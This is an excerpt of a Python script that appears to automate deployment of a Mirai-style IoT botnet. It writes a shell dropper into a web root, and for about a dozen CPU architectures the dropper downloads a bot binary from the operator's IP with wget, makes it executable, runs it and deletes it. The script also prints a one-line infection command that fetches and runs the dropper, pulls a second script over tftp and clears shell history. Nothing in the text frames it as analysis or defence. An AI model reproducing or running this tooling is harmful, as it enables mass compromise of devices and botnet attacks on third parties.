...
if len(sys.argv[2]) != 0:
    ...
    print("\033[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \033[0m")
    exit(1)
    
bot = sys.argv[1]
user= raw_input("Get Arch y/n:")
if user.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["ilovechickennuggets.mips" , 
             "ilovechickennuggets.mpsel" , 
             "ilovechickennuggets.sh4",
             "ilovechickennuggets.x86",
             "ilovechickennuggets.Armv61",  
             "ilovechickennuggets.i686",   
             "ilovechickennuggets.ppc",   
             "ilovechickennuggets.i586",   
             "ilovechickennuggets.m68k",
             "ilovechickennuggets.armv7l",
			 "ilovechickennuggets.armv4l",
             "ilovechickennuggets.armv4l" , 
             "ilovechickennuggets.armv5l"]
...
run('echo -e "#!/bin/bash" > /var/www/html/lazer.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/lazer.sh')
...
print("\033[34mMalware Download\033[32m: \033[91mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/lazer.sh; chmod 777 *; sh lazer.sh; tftp -g " + ip + " -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")